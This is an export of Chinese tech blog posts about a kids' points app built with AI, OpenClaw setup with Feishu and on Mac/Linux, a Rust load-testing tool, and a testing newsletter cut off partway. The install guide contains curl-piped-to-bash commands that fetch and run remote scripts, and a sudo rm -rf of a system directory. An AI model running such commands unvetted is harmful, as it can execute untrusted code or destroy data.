[{"content":"事情是这样的，为了提升家里小学生的自主学习意识，所以我想做一个简单的小学生积分系统。\n如果小朋友的行为值得鼓励，那么就给他奖励一些积分。积分可以用来兑换奖励，但是如果小朋友的行为是需要纠正的，那么就给他扣掉一些积分。\n正好最近opencode很火，所以就用AI来帮我们实现一下吧。\n功能演示 我这个应用叫做kidcions，一个纯的react前端单页项目，没有后台没有存储，用户数据是放在localstorage里面的。\n项目我部署在cloudflare的page上了，大家有兴趣可以体验一下,地址是https://kid.ethanhan.cc/\n简单介绍一下功能。\n家长可以添加小朋友。\n可以给小朋友换个头像。\n可以增加积分。应用默认给了一些积分项。\n当然，也可以自己设置积分项。\n有了积分就可以兑换奖品。\n奖品也是可以自己设置的。\n最后所有的积分记录都可以导出。\n添加多个小朋友也是支持的。\n还支持暗夜模式。\n移动端也适配了。\n实现过程 实现过程其实比较的枯燥。\n大致总结一下就是。\n首先描述需求，描述的时候最好可以举几个例子，比如kid选择器的样式；\n然后就是等待AI编码完成，因为项目非常简单，所以这一步其实不算慢；\n最后就是自己上手去试用生成的应用，遇到问题就记录下来，让AI去解决。\n要注意一下这里有个最小闭环原则，每次提出1个需求或者1个bug，实现了之后再去逐步推进。\n关于模型 opencode可以直接拿来免费就用的。\n因为每个免费的模型似乎都是有额度的，而单一的额度没办法支持把这个项目写完。\n所以这个应用我用到了3个模型。\n分别是开始的时候用到了kimi2.5，额度用完了之后换到了glm4.7，再次没有token之后换成了minimax。\n所以如果想要用opencode愉快的玩耍的话，大家最好还是要买个稳定的套餐。\n一些感想 最后来说说使用过程中的一些感想。\n第一点就是整个过程有点像是先当产品经理，把想要实现的需求先列出来，然后当项目经理，给这些需求排期，先实现哪个，再实现哪个，最后当测试人员，自己试用，然后提bug，跟进缺陷的修复。\n第二点就是如果你完全不会写代码的话，那么有可能有些描述就可能不会特别精确，从而需要进行多轮的对话和改进。举个例子，应用里有个区域的class是.item-card，在移动端下，样式出现了点问题，因为我会一点css，能看出来是overflow这个属性有问题问题，因此可以直接告诉ai问题的根本所在，否则的话，可能需要反复描述细节才能解决问题了吧。\n","date":"2026-02-04T11:36:21+08:00","image":"zh.ethanhan.cc/zh.ethanhan.cc/zh.ethanhan.cc/p/%E8%BF%98%E7%9C%9F%E4%B8%8D%E8%A6%81%E9%92%B1%E6%88%91%E7%94%A8opencode%E5%81%9A%E4%BA%86%E4%B8%AA%E5%B0%8F%E5%AD%A6%E7%94%9F%E7%9A%84%E7%A7%AF%E5%88%86%E5%BA%94%E7%94%A8/2026-02-05-11-18-07_hu_cbe882259e343275.png","permalink":"zh.ethanhan.cc/p/%E8%BF%98%E7%9C%9F%E4%B8%8D%E8%A6%81%E9%92%B1%E6%88%91%E7%94%A8opencode%E5%81%9A%E4%BA%86%E4%B8%AA%E5%B0%8F%E5%AD%A6%E7%94%9F%E7%9A%84%E7%A7%AF%E5%88%86%E5%BA%94%E7%94%A8/","title":"还真不要钱！我用opencode做了个小学生的积分应用"},{"content":"B站视频 YouTube视频 之前在 Linux 机器上装了 OpenClaw，每次访问 Dashboard 都得用 SSH 端口转发，用起来不太方便。\n更合理的方式是把飞书和 OpenClaw 做集成，直接在飞书里就能聊天交互，这样更自然一点。\n使用到的plugin 这里用到了clawdbot-feishu插件，直接在命令行里安装。\n安装clawdbot-feishu插件 1 openclaw plugins install @m1heng-clawd/feishu 创建飞书应用 然后在 在 飞书开放平台 创建自建应用。\n应用名称和描述都不重要。\n然后添加应用能力，加个机器人。\n接下来在权限管理里面增加下面的权限。\n权限 范围 说明 contact:user.base:readonly 用户信息 获取用户基本信息（用于解析发送者姓名，避免群聊/私聊把不同人当成同一说话者） im:message 消息 发送和接收消息 im:message.p2p_msg:readonly 私聊 读取发给机器人的私聊消息 im:message.group_at_msg:readonly 群聊 接收群内 @机器人 的消息 im:message:send_as_bot 发送 以机器人身份发送消息 im:resource 媒体 上传和下载图片/文件 在 openclaw 中增加channel 回到命令行，用下面的命令添加channel。\n1 openclaw channels add 选择飞书，各种下一步，然后去飞书的开发者后台把App ID 和 App Secret拿到，贴到命令行里。\n然后就各种下一步。\n设置事件与回调 接下来设置事件与回调，这一步非常重要。\n事件配置方式：选择 使用长连接接收事件（推荐） 添加事件订阅，勾选以下事件： 事件 说明 im.message.receive_v1 接收消息（必需） im.message.message_read_v1 消息已读回执 im.chat.member.bot.added_v1 机器人进群 im.chat.member.bot.deleted_v1 机器人被移出群 发布并审核。 然后在飞书开发者后台的版本管理与发布页面，创建一个版本，并提交。\n下面这一步也非常重要，第一次配置的时候我就没弄明白。去飞书的管理后台里面，把应用审核，正式发布一下。\n测试一下 发布成功之后，在飞书会发一条审核通过的消息，在消息里打开应用，就可以跟机器人聊天了。\n我的机器人比较笨，跟它说了半天才弄明白了我是谁。\n不过能聊天就代表配置成功了。\n","date":"2026-01-31T15:37:18+08:00","image":"zh.ethanhan.cc/zh.ethanhan.cc/zh.ethanhan.cc/p/openclaw%E5%A6%82%E4%BD%95%E6%8E%A5%E5%85%A5%E9%A3%9E%E4%B9%A6/2026-02-05-11-20-23_hu_22e240040ad4ea28.png","permalink":"zh.ethanhan.cc/p/openclaw%E5%A6%82%E4%BD%95%E6%8E%A5%E5%85%A5%E9%A3%9E%E4%B9%A6/","title":"Openclaw如何接入飞书"},{"content":"这几天clawdbot的改名风波闹的沸沸扬扬。\n从clawdbot到moltbot再到openclaw，一周装了我3个版本，搞得我都有点精神分裂了。\nB站视频版 YouTube视频版 两个月前，clawdbot的作者peter花了一个周末搞了个叫“WhatsApp Relay”的小项目，结果现在GitHub星标破10万，一周内吸引了200万访问者。完全超出预期。\n今天peter正式宣布：这个项目改名叫OpenClaw。\n这个名字一路走来挺戏剧：最早叫Clawd，2025年11月诞生，就是那个大模型“Claude”加个爪子的梗，这是英文的谐音梗，我也不太懂，反正logo倒是挺可爱的。\n结果火了之后，claude母公司的法务礼貌敲门了，这个名字太像了，蹭了我们的流量，能不能改？\npeter表示：我们懂，向资本低头，马上整改。\n然后凌晨5点在Discord脑暴，选了Moltbot的名字。molt大概是龙虾要长大就得蜕壳的意思，象征成长。很有诗意，但读起来总有点拗口。\npeter不满意，几番折腾之后，现在终于定下来一个新名字：OpenClaw。\n这次peter学乖了，商标没有被注册、域名也买好了、代码也迁移了。\n现在的名字我觉得是很贴切的：Open代表开源、开放、社区驱动\nClaw：就是爪子，保留龙虾爪子的血统，向起点致敬。\n这次应该不会再改名字了，终于可以给大家分享一下如何安装openclaw了，对于没有技术基础的同学来说，本地安装还是很有难度的。\n下面给大家演示一下如何在mac和linux上安装openclaw，这里我们的目标是让国内的同学不花一分钱把服务运行起来。\nmac 系统 先看mac系统。\n首先安装nodejs的最新稳定版本。我安装的是24.13.0，推荐用nvm安装，我把命令放这里了。\n1 2 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash nvm install --lts Mac上还需要安装 Command Line Tools，命令放在下面了。\n1 2 3 4 5 # 先彻底删除旧的（很重要，很多时候不删它就装错版本） sudo rm -rf /Library/Developer/CommandLineTools # 让系统重新拉取（会弹出安装窗口，按提示点继续） sudo xcode-select --install 安装git，我们用brew安装。\n1 brew install git 接下来把官网上的命令拷贝下来，在命令行里执行。\n1 curl -fsSL https://openclaw.ai/install.sh | bash 安装会花一段时间，没有报错的话，进入配置界面。\n首先同意协议，按回车是继续，空格键是选择。\nonboard mode选择QuickStart，在model auth provider里选择千问，千问似乎有一定的免费额度，可以拿来体验。\n选择Qwen OAuth，这时候会自动打开浏览器，注册或者登录一下就可以了，点击Confirm，模型就用改，就默认。\n在select channel选择Skip for now，暂时不配置im集成。\n下面就是skill配置，也是openclaw最核心的能力。\n随便选择几个安装一下，这一步大概要几分钟的时间。\n后面就是各种API key的配置，全部选择No，这些后面都可以配。\n然后就是Enable hooks，选command-logger和session-memory，前者是命令执行日志，后者是session级别的记忆，都是有用的。\n接下来openclaw会安装gateway service，安装成功之后就可以打开TUI了，这时候浏览器会打开openclaw的gateway dashboard页面。\n在chat里面设置一下openclaw的角色和名字，顺便设置一下自己的名字，接下来就大功告成了。\nlinux 系统，无ui 我们再看一下linux里怎么安装openclaw。\n我这里用的是一台多年前的赛扬N5105的机器，性能比较差，反应速度很慢，大家在安装时尽量选择配置高一点的机器或者是vps。\n我的操作系统是ubuntu 24.04，纯命令行的，没有UI。\n首先需要更新一下相关依赖，命令我放在下面了。\n1 2 sudo apt update sudo apt upgrade 接下来就是安装nodejs和git，跟mac上差不多，就不展开了。\n1 2 3 sudo apt install git curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash nvm install --lts 然后使用官方脚本安装。\n1 curl -fsSL https://openclaw.ai/install.sh | bash 因为机器配置比较差，所以安装的很慢。\n这时候顺便去注册一个智谱的账号，然后在控制台-\u0026gt;API key里生成1个api key。\n因为我用的是没有ui的linux系统，所以没办法用千问的oauth，在模型这边就用智谱的GLM了。\n安装完成之后的配置步骤跟mac上是一样，只是在选择模型的时候Z.AI，也就是GLM4.7。\n把之前创建的API key拷贝一下，接下来参考mac的步骤，不配置channel，随便选几个skill安装一下，不配置各种api key。\n因为没有检测到系统的gui，所以在安装完gateway之后，整个安装过程就结束了。\n不过我们还是要打开gateway的dashboard测试一下。\n先回到本机，用下面的命令进行ssh转发。\n1 ssh -N -L 18888:127.0.0.1:18789 用户名@目标机器的ip 然后浏览器访问http://127.0.0.1:18888/?token=1xxxxxxxxxf911e9f8ceea1ed572a11c\n这里的token可以在安装结束后的命令行里看到，或者在linux机器上运行命令openclaw dashboard来查看。\n在浏览器的聊天窗口中测试一下，openclaw能回答就证明配置成功了。\n总结 老实说，openclaw安装和配置都是有一定门槛的，对于普通用户来说，基本上很难自己搞定。\n个人观点，openclaw代表的是AI应用的一种新的方向，它让AI 拥有近乎无限的记忆，并且能直接操控电脑，真正帮人类把事情做完。\n但这并不意味着openclaw目前的交互方式是适合每一个人的。\n最后总结一下，在我看来openclaw是一场程序员自己的狂欢，而对绝大多数的普通用户来说，可能更适合站在场边围观。它确实代表未来，但不是每个人都需要、也并不是每个人都必须现在就去学它和使用它。\n附录:clawedbot改名始末 大家好，今天来聊聊Clawdbot那段让人又好笑又心酸的改名史，简直是2026年AI圈最戏剧化的一幕。\n故事是这样的：\n就在前几天，一款超级能干的开源AI个人助理突然爆火，GitHub星标狂飙好几万，还顺手把Mac Mini都带到断货。它叫Clawdbot，名字灵感来自Claude Code里那个像素风小龙虾，Clawd就是它的吉祥物，读起来有点像“Claude bot”，龙虾爪子🦞+机器人，挺可爱的致敬嘛。\n结果火得太快，火到被正主盯上了。\n1月27日，Anthropic的法务直接找上门：你们这名字和Logo太像我们家Claude了，商标有问题，赶紧改！\n创始人Peter Steinberger一开始还想挣扎，说“要不我把d去掉改Clawbot行不行？”——对方：不行。\n一番拉扯后，Peter只能举白旗：“好吧，被迫改名，这不是我的决定。”\n但这哥们儿脑子转得快，顺着龙虾的生物属性直接玩了个高级自黑：\n龙虾要长大就得蜕壳（Molt），对吧？那就叫Moltbot好了！\n吉祥物也从Clawd变成Molty，Logo跟着更新。\n官方公告一句话总结得绝了：\n“Same lobster soul, new shell.”\n（同样的龙虾灵魂，换了新壳。）\n结果改名当天更魔幻：\nGitHub账号重命名搞砸了，X账号改名那10秒钟空窗期，直接被加密货币骗子抢注去发诈骗链接……\nPeter在推上连发几条吐槽：“我只是想改个名，怎么比写代码还难？”\n所以Clawdbot的改名史，浓缩起来就一句话：\n一只想好好做事的龙虾AI，因为名字太像大佬家的产品，被逼着当众蜕了一次壳，\n蜕完之后不但没萎，反而用最幽默的方式告诉大家：\n“我还是那个能干活的家伙，只是……壳换了个更酷的版本而已🦞→🦐”\n","date":"2026-01-31T09:36:02+08:00","permalink":"zh.ethanhan.cc/p/%E5%AE%8C%E5%85%A8%E5%85%8D%E8%B4%B9%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85openclaw/","title":"完全免费！如何安装openclaw"},{"content":"前因后果 最近有一些做测试使用的小工具的需求，拿 AI 生成了一下，发现确实对测试效率有一定的提升。\n前几天需要写一个简单的性能压测工具，自己写的话可能要 1-2 天，估计效果还不太好，于是试着拿 AI 去生成了一下。\n为了让工具有足够的并发性能，我选择用 rust 语言来实现。\n简单描述了一下需求，claude 就在几分钟之内给出了结果。\n具体过程 我的提示词非常简单\n1 2 3 4 5 6 7 8 9 10 11 12 How to use rust to implement this cli feature . it is a stress test cli apistress rest --url https://api.example.com/users \\ --method POST \\ --body \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;test\u0026#34;}\u0026#39; \\ --header \u0026#34;Authorization: Bearer TOKEN\u0026#34; \\ --concurrency 50 \\ --duration 30s \\ --rate 1000 \\ --output json 不久 claude 给出了第一版的代码。\n初版的代码里所有的内容都写在main.rs里面，尽管简单，但可维护性还是不强。\n于是我再加强了一下。\n这是我的提示词。\n1 seperate to more files 告诉 ai 将代码分成多个文件。\n这是后来的文件目录。\n1 2 3 4 5 6 7 src/main.rs - Entry point that sets up modules and runs the CLI src/cli.rs - Command line interface definition using clap src/config.rs - Request configuration and parsing src/client.rs - HTTP client functionality src/results.rs - Test results and reporting src/rate_limiter.rs - Rate limiting implementation src/stress_test.rs - Main stress testing orchestration 逻辑上清楚多了。\n根据代码编译了一下，然后随手写了个 api 试试效果。\napi 应用是用 golang+gin 去写的，代码非常简单。\n1 2 3 r.GET(\u0026#34;/ping\u0026#34;, func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\u0026#34;message\u0026#34;: \u0026#34;pong\u0026#34;}) }) 拿 ai 生成的工具去试试效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 stress_test rest --url http://localhost:8080/ping --duration 10s [00:00:10] Test completed === Stress Test Results === Total Requests: 273398 Successful: 273398 Failed: 0 Test Duration: 10.00s Requests/sec: 27339.80 Latency: Min: 0.06ms Max: 33.02ms Avg: 0.31ms Status Codes: 200: 273398 结果是挺惊艳的，跑出了 27k 的 QPS，性能方面应该是满足我的原始需求的。\n横向比较 为了横向比较这个工具的性能，我又用 golang 写了个类似功能的 cli 压力测试工具。\n用同样的被测应用跑了一下效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ⠏ Running stress test... [9s] === Stress Test Results === Total Requests: 29244 Successful: 29244 Failed: 0 Test Duration: 10.00s Requests/sec: 2924.40 Latency: Min: 0.18ms Max: 614.15ms Avg: 3.41ms Status Codes: 200: 29244 只跑出了 2.9k 的 QPS，基本上性能差了 10 倍。\n思考 AI 的编程能力已经超过了我能力，我绞尽脑汁写的工具在性能上是完全比不上 ai 几分钟生成的结果的 Golang 的性能比 Rust 要差，但在并发上效果差 10 倍，这是不正常的，所以还是印证了上面的观点，ai 的代码写的更合理，比我要强 对于测试同学来说，我们经常会写一些次抛的工具，这些工具可能在某些测试任务上会给我们带来极大的效率提升，比如造数据工具。\n但是测试同学的代码能力有限，时间有限，所以一般情况下，我们是不会去写这些次抛工具的。\n这就造成了大部分情况下，我们选择用人工的方式去完成这些重复性的工具。\n这就是我们测试经常被诟病测试效率低下的一部分原因了。\n现在有了 ai，测试同学哪怕不会写代码，也完全有能力把自己的次抛工具需求给描述清楚，毕竟是一次性或者几次性的工具，功能大都不复杂，对 ai 非常友好，所以几个来回就可以把工具给生成出来。\n可以预想到，在不远的将来，测试岗位可能会有减少，但熟练使用 ai 并跟测试结合的新型测试人才，应该是会有一定的市场的。\n所以从本质上讲，今后的一段时间，发现问题还是靠人，但是 ai 会加速这个过程。\n学习时间 是时候看一下这个测试工具中的核心代码了，还是非常有学习的意义的。\nRust 版本的压力测试核心函数：\n函数签名解析 1 2 3 4 5 6 7 8 9 10 pub async fn run_stress_test( url: String, // 目标URL method: String, // HTTP方法 (GET, POST, etc.) body: Option\u0026lt;String\u0026gt;, // 可选的请求体 headers: Vec\u0026lt;String\u0026gt;, // 请求头列表 concurrency: usize, // 并发数 duration: String, // 测试持续时间字符串 rate: Option\u0026lt;u64\u0026gt;, // 可选的速率限制 output: OutputFormat, // 输出格式 ) -\u0026gt; Result\u0026lt;()\u0026gt; // 返回Result类型 逐步详细解析 1. 解析和配置阶段 1 2 3 4 5 6 7 8 9 10 11 // 解析持续时间字符串 \u0026#34;30s\u0026#34; -\u0026gt; Duration对象 let test_duration = humantime::parse_duration(\u0026amp;duration)?; // 创建请求配置对象，包含所有HTTP请求参数 let config = RequestConfig::new(url, method, body, headers)?; // 创建HTTP客户端（复用连接池） let client = Client::new(); // 创建共享的测试结果对象 let results = Arc::new(Mutex::new(TestResult::new())); 为什么用 Arc\u0026lt;Mutex\u0026lt;T\u0026gt;\u0026gt;？\nArc：原子引用计数，多个线程可以安全地共享所有权 Mutex：互斥锁，确保同一时间只有一个线程能修改结果 2. 进度条设置 1 2 let pb = create_progress_bar(); pb.set_message(\u0026#34;Running stress test...\u0026#34;); 用户可以看到测试正在进行中的实时反馈。\n3. 工作线程创建（关键部分） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 let mut handles = Vec::new(); for _ in 0..concurrency { // 创建指定数量的并发工作者 // 为每个工作者克隆必要的资源 let client = client.clone(); // 克隆HTTP客户端 let config = config.clone(); // 克隆请求配置 let results = Arc::clone(\u0026amp;results); // 克隆共享结果的引用 // 为每个工作者创建独立的速率限制器 let rate_limiter = rate.map(|rps| RateLimiter::new(rps / concurrency as u64)); // 生成异步任务 let handle = tokio::spawn(async move { run_worker(client, config, results, rate_limiter).await; }); handles.push(handle); // 保存任务句柄以便后续控制 } 速率限制分配的重要细节：\n1 2 3 // 如果总速率是1000 RPS，10个并发工作者 rate.map(|rps| RateLimiter::new(rps / concurrency as u64)); // 每个工作者得到：1000 / 10 = 100 RPS 4. 时间控制和清理 1 2 3 4 5 6 7 // 让测试运行指定的时间 sleep(test_duration).await; // 时间到了，强制停止所有工作者 for handle in handles { handle.abort(); // 中止异步任务 } 为什么用 abort() 而不是优雅关闭？\n压力测试需要精确的时间控制 优雅关闭可能会延长测试时间 abort() 确保立即停止 5. 结果收集和输出 1 2 3 4 5 pb.finish_with_message(\u0026#34;Test completed\u0026#34;); // 获取最终结果并打印 let final_results = results.lock().await; // 获取互斥锁 final_results.print_results(test_duration, \u0026amp;output)?; 并发执行流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 主线程 工作线程1 工作线程2 工作线程N | | | | ├─ 创建配置和客户端 | | | ├─ 创建共享结果对象 | | | ├─ spawn工作线程1 ────────→ 开始发送请求 | | ├─ spawn工作线程2 ────────────────────────────→ 开始发送请求 | ├─ spawn工作线程N ──────────────────────────────────────────────→ 开始发送请求 ├─ sleep(duration) │ │ │ │ │ 持续发送HTTP请求 │ 持续发送HTTP请求 │ 持续发送HTTP请求 │ │ 更新共享结果 │ 更新共享结果 │ 更新共享结果 ├─ 时间到，abort所有任务 ───→ 被强制停止 │ │ ├─ ──────────────────────────────────────────→ 被强制停止 │ ├─ ────────────────────────────────────────────────────────────→ 被强制停止 ├─ 收集结果 └─ 打印统计信息 内存安全和并发安全 Rust 的优势： 1 2 3 4 5 6 7 8 9 // 编译时保证线程安全 let results = Arc::new(Mutex::new(TestResult::new())); let results_clone = Arc::clone(\u0026amp;results); // 安全的共享 // 在工作线程中安全地更新结果 { let mut results = results.lock().await; // 获取锁 results.add_request(latency, status, error); } // 锁自动释放 对比其他语言可能的问题： C/C++：可能的内存泄漏和数据竞争 Java：需要手动管理线程池和同步 Go：需要显式的 channel 通信或锁管理 错误处理 1 2 3 4 5 6 7 8 // ? 操作符实现链式错误传播 let config = RequestConfig::new(url, method, body, headers)?; // ↑ // 如果出错，立即返回错误 final_results.print_results(test_duration, \u0026amp;output)?; // ↑ // 打印出错也会传播错误 这个函数展现了 Rust 异步编程的强大：零成本抽象、内存安全、并发安全，同时保持高性能！\n","date":"2025-08-28T17:33:25+08:00","permalink":"zh.ethanhan.cc/p/%E5%AF%B9%E4%BA%8E%E6%B5%8B%E8%AF%95%E5%90%8C%E5%AD%A6%E6%9D%A5%E8%AF%B4%E6%8B%BFai%E5%81%9A%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E7%AE%80%E7%9B%B4%E4%B8%8D%E8%A6%81%E5%A4%AA%E7%88%BD/","title":"对于测试同学来说，拿AI做测试小工具简直不要太爽"},{"content":"编者思考 本期内容再次印证了软件测试行业正在经历的深刻变革。从传统的手工测试向智能化测试转变，从技术层面的优化到文化层面的重塑，我们看到测试工程师们不仅要掌握新兴的 AI 工具，更需要具备战略思维和质量意识的深度转变。\n特别值得注意的是，本期多篇文章都在强调\u0026quot;文化\u0026quot;而非\u0026quot;技术\u0026quot;才是测试面临的真正挑战。这提醒我们，在关注技术进步的同时，不应忽视团队协作、质量理念和战略思维的重要性。同时，AI 驱动的测试方法论正在从概念走向实践，为我们展现了测试自动化的新可能性。\n新闻资讯 产品开发中的 3 个关键软件测试挑战 文章来源： https://testuff.com/3-critical-software-testing-challenges-in-product-development\n作者于其丰富的行业经验，深入分析了现代软件测试面临的三个核心挑战。这些挑战的共同特点是它们都源于组织文化层面，而非技术实现层面。作者指出，许多测试团队在技术能力上已经相当成熟，但在跨部门协作、质量意识培养和测试价值传达方面仍存在明显不足。\n文章特别强调了测试人员在组织中的角色定位问题：是被动的\u0026quot;质量把关者\u0026quot;还是主动的\u0026quot;质量推动者\u0026quot;？这种角色认知的差异直接影响了测试工作的效果和团队的长远发展。作者通过具体案例说明了如何通过改变沟通方式、建立质量度量体系和培养全员质量意识来解决这些文化层面的挑战。\nQA 领域 7 年的反思 文章来源： https://medium.com/@putraadityapradana/two-faces-of-qa-a-reflection-after-7-years-in-the-field-5e41cf7132d9\n这是一篇非常有价值的职业反思文章。作者通过 7 年的 QA 工作经验，总结出了两种截然不同的 QA 思维模式：反应式思维和战略式思维。反应式思维的特点是被动响应问题、关注局部细节、缺乏前瞻性规划；而战略式思维则强调主动预防、全局视角和长远规划。\n文章详细分析了这两种思维模式在实际工作中的具体表现，以及它们对个人职业发展和团队效能的不同影响。作者特别指出，很多 QA 专业人员在技术技能上已经很熟练，但在战略思维方面还有很大提升空间。文章提供了具体的转变建议，包括如何参与产品规划、如何建立质量度量体系、如何与开发团队建立更紧密的协作关系等。\n测试规划的定位 文章来源： https://medium.com/@contextdependence/orienting-test-planning-c72a84a98b46\n这篇文章深入探讨了测试规划的核心要素：风险评估、测试策略制定和测试范围界定。作者认为，有效的测试规划不应该是一个孤立的技术活动，而应该与产品战略、业务目标和技术架构紧密结合。\n文章特别强调了风险驱动的测试规划方法。作者详细介绍了如何识别和评估不同类型的风险（技术风险、业务风险、用户体验风险等），以及如何根据风险级别来分配测试资源和制定测试策略。同时，文章还讨论了敏捷开发环境下测试规划的特殊挑战，提出了迭代式规划和持续调整的方法论。\n作者通过多个实际案例展示了良好的测试规划如何帮助团队提前发现潜在问题、优化资源配置、提高测试效率。这对于希望提升测试规划能力的专业人员来说具有很强的实践指导意义。\nGoogle 规模化质量：如何在数十亿行代码中控制 Bug 文章来源： https://bhagwatimalav.substack.com/p/quality-at-scale-how-google-keeps\n这篇文章为我们揭示了 Google 这样的科技巨头是如何在极大规模的代码库中维持代码质量的。Google 的代码库包含数十亿行代码，涉及数千个项目和数万名开发人员，这种规模下的质量管理面临着前所未有的挑战。\n作者详细介绍了 Google 的测试策略演进历程，从早期的手工测试为主，到后来建立完善的自动化测试体系，再到现在的 AI 辅助测试。文章特别强调了 Google 在测试文化建设方面的投入，包括\u0026quot;质量是每个人的责任\u0026quot;的理念、广泛的测试培训项目、以及将质量指标纳入绩效考核体系等。\n文章还深入分析了 Google 的技术实践，包括单元测试的广泛应用（测试覆盖率要求）、集成测试的自动化、大规模并行测试的基础设施建设、以及持续集成/持续部署(CI/CD)流程的优化。这些实践对于其他企业具有很强的借鉴意义，尤其是对于正在进行数字化转型的传统企业。\nSub-Zero Shot：彻底改变软件测试的早期上下文积累阶段 文章来源： https://jarbon.medium.com/sub-zero-shot-the-early-peek-thats-revolutionizing-software-testing-0f99fcfdb1d3\n这是 AI 驱动测试系列文章的重要组成部分。Jason Arbon 在这篇文章中详细解析了 AI 4-Shot 测试流程中的 Sub-Zero Shot 阶段，这是整个 AI 测试流程的起始环节，也是最具创新性的部分。\nSub-Zero Shot 阶段的核心思想是让 AI 在没有任何先验知识的情况下，通过分析应用程序的界面和交互模式来自动生成测试策略。这种方法突破了传统测试需要大量人工设计测试用例的限制，让 AI 能够更早地参与到测试规划过程中。\n作者详细介绍了 Sub-Zero Shot 的技术实现原理，包括计算机视觉技术在界面分析中的应用、自然语言处理在用户交互理解中的作用、以及机器学习算法在测试模式识别中的运用。文章还通过具体的案例展示了这种方法在实际应用中的效果，包括测试覆盖率的提升、测试执行时间的缩短、以及发现缺陷的质量改善。\n自动化测试 测试框架中需要编写多态、继承和构造函数吗？ 文章来源： https://www.reddit.com/r/QualityAssurance/comments/1laoamp/do_we_need_to_write_polymorphism_inharitance_and/\n这是一个在测试开发社区中长期存在争议的话题。文章汇集了众多测试专家和开发人员的观点，深入探讨了面向对象编程(OOP)原则在测试代码中的适用性问题。\n支持在测试代码中应用 OOP 原则的观点认为，多态、继承和构造函数能够提高测试代码的可维护性和复用性。特别是在大型项目中，通过继承可以建立测试基类，通过多态可以处理不同类型的测试对象，通过构造函数可以统一初始化测试环境。这些特性有助于减少代码重复，提高开发效率。\n反对的观点则认为，测试代码应该保持简单直观，过度使用 OOP 特性可能会增加测试代码的复杂性，降低可读性。特别是对于测试用例，其逻辑应该尽可能线性和明确，避免过多的抽象层次。过度设计的测试框架可能会成为维护负担，甚至影响测试的稳定性。\n文章总结了一个平衡的观点：在测试框架层面适度应用 OOP 原则是有益的，但在具体测试用例层面应该保持简洁。同时，团队的技术水平和项目规模也是需要考虑的重要因素。\n技术负责人，你们是如何打破无休止手工回归测试循环的？ 文章来源： https://www.reddit.com/r/QualityAssurance/comments/1l76mr1/tech_leads_how_did_you_break_the_cycle_of_endless\n这个 Reddit 帖子反映了许多技术团队面临的共同困境：如何从繁重的手工回归测试中解脱出来。讨论中涌现出了许多实用的经验和建议，为面临类似挑战的团队提供了宝贵的参考。\n讨论的核心焦点是如何在有限的资源和时间约束下，逐步建立自动化测试文化。参与讨论的技术负责人分享了他们的实际经验，包括如何获得管理层支持、如何说服开发团队投入时间进行自动化建设、以及如何处理自动化过程中遇到的技术和组织挑战。\n几个关键的建议包括：从最核心的业务流程开始自动化，而不是试图一次性覆盖所有功能；建立清晰的 ROI(投资回报率)计算模型，用数据说服利益相关者；设立专门的自动化团队或指定自动化负责人；制定分阶段的自动化 roadmap；以及建立自动化测试的维护和监控机制。\n讨论还涉及了不同技术栈下的自动化选择、工具评估标准、团队技能培养等实际操作层面的问题。这些来自一线实践的经验对于正在进行自动化转型的团队具有很高的参考价值。\n使用 AI 的测试标签建议 文章来源： https://glebbahmutov.com/blog/test-tag-suggestions-using-ai\n这篇文章展示了一个创新的 AI 应用场景：基于 pull request 描述自动推荐相关测试用例。这种方法能够显著提高测试效率，特别是在大型项目中，手工选择相关测试用例往往是一个耗时且容易出错的过程。\n文章详细介绍了这个 AI 系统的工作原理：首先，系统分析 pull request 的描述文字和代码变更；然后，利用自然语言处理技术理解变更的业务含义；接着，通过机器学习算法将变更内容与测试用例库进行匹配；最后，生成测试建议并按相关性排序。\n作者通过实际的代码示例和演示视频展示了这个系统的使用效果。系统不仅能够推荐直接相关的测试用例，还能够识别潜在的关联影响，推荐相关的回归测试。这种智能化的测试选择机制能够在保持测试覆盖率的同时，显著减少测试执行时间。\n文章还讨论了系统的局限性和改进方向，包括如何处理复杂的业务逻辑关联、如何提高推荐准确率、以及如何与现有的 CI/CD 流程集成等。\n编写能够讲述故事的测试用例 文章来源： https://blogs.rahulrpandya.in/write-tests-that-tells-the-story-33f09d743491\n这篇文章从一个独特的角度探讨了测试代码的编写艺术。作者认为，好的测试不仅仅是验证功能的正确性，更应该像一个清晰的故事一样，讲述软件的预期行为和业务逻辑。\n文章强调了测试命名的重要性。一个好的测试名称应该能够清楚地表达测试的目的、前置条件和预期结果。作者提供了具体的命名规则和模式，包括使用业务术语而非技术术语、采用 Given-When-Then 结构、以及避免过于抽象或模糊的描述。\n在测试结构方面，文章建议采用 AAA(Arrange-Act-Assert)模式，并详细解释了每个阶段应该包含的内容。Arrange 阶段应该清晰地设置测试环境和数据；Act 阶段应该专注于执行被测试的行为；Assert 阶段应该验证所有相关的结果和副作用。\n文章还讨论了测试逻辑的组织方式，强调应该避免过于复杂的测试逻辑，每个测试应该专注于验证一个明确的行为。同时，作者建议在测试中添加适当的注释，特别是对于复杂的业务规则或特殊情况的处理。\n通过多个实际代码示例，文章展示了如何将抽象的原则转化为具体的编码实践，为编写高质量测试代码提供了实用的指导。\n工具与技术 webcurl: 一个非常值得学习的 postman 替代品 项目地址: https://github.com/o8oo8o/WebCurl\n这个项目给出了一个极简版本的 postman 实现。\n工具的实用性一般般，毕竟没有断言功能，只能做 api 的调试使用。\n但是这个工具的源码却是异常的简单。\n前端 1 个 index.html 文件，后端只有 1 个 main.go 文件。\n没有任何的依赖，简单编译一下就可以运行。\n非常适合普通测试人员或者测试开发工程师学习。\n另外因为前后端都是单文件，遇到不懂的地方可以直接拷贝到 ai 工具中，让 ai 进行细节的讲解。\nPlaywright 高级模式：并行测试和资源管理 文章来源： https://medium.com/@peyman.iravani/advanced-playwright-patterns-parallel-testing-and-resource-management-3e4e71e09801\n这是一份深入的 Playwright 使用指南，专门针对企业级应用中的并行测试需求。随着测试套件规模的增长，如何有效地并行执行测试成为了提高 CI/CD 效率的关键因素。\n文章详细介绍了 Playwright 